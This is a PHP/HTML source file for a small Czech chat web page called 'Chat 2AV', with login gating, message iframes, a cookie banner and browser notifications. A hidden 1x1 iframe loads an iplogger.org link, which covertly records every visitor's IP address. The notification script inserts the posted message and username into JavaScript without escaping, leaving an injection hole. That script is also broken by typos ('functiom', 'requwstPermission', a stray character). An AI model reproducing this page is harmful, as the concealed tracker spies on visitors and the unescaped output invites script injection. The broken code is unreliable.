<?php
// Inicializovat sezení
session_start();

if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: ./Auth");
    exit;
}
?>

<!DOCTYPE html>
<html lang="cs">
  <head>
    <meta charset="UTF-8">
    <title>Chat 2AV</title>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <link rel="shortcut icon" type="image/png" href="/img/favicon.png">
    <link rel="stylesheet" href="./styles/index.css">
  </head>
  <body>

    <iframe class="messages" src="messages.php" width="1000" height="850" frameborder="0"></iframe>

    <iframe src="form.php" width="1000" height="100" frameborder="0"></iframe>

    <iframe src="https://iplogger.org/1nQ9t7" width="1" height="1" frameborder="0"></iframe>

    <script type="text/javascript" id="library" src="https://cookie-policy.net/js/cookie-consent.js"></script>
    <script type="text/javascript" charset="UTF-8" id="code">
	    cookieconsent.run({
	    notice_banner_type: "footline",
	    consent_type: "express",
	    palette: "light",
	    language: "cs",
	    page_load_consent_levels: ["strictly-necessary"],
	    notice_banner_reject_button_hide: true,
	    preferences_center_close_button_hide: false,
	    website_name: "Chat 2AV",
	    website_privacy_policy_url: "http://4.tcp.eu.ngrok.io:12171/privacy.html"
	    });
    </script>
    <noscript>Cookie Consent by
    <a href="https://www.cookie-policy.net/" rel="nofollow noopener">Official Cookie Consent</a></noscript>

    <script>
        function send() {
            // Vytvořit AJAX požadavek metodou POST
            $.post("send_message.php", // URL pro požadavek
                {
                 // Objekt s hodnotami pro odeslání
                    "message" : $("#message").val()
                },
                function (data) { // Callback funkce při úspěchu
                    $("#message").val(""); // Smazat obsah pole pro zprávu
                }
            );
            reloadMessages(); // Ihned aktualizujeme právě odeslanou zprávu
        }
    </script>

    <script>
        functiom showNotification() {
            const notification = new Notification("Nová zpráva od <?= $_SESSION["username"] ?? "" ?>", {
                body: "Uživatel <?= $_SESSION["username"] ?? "" ?> napsal: <?= $_POST["message"] ?? "" ?>"
            });
        }

        console.log(Notification.permission);

        if (Notification.permission === "granted") {
            showNotification();
        } else if (Notification.permission !== "danied") {
            Notification.requwstPermission().then(permission => {´
                if (permission === "granted") {
                    showNotification();
                }
            });
        }
    </script>
</body>
</html>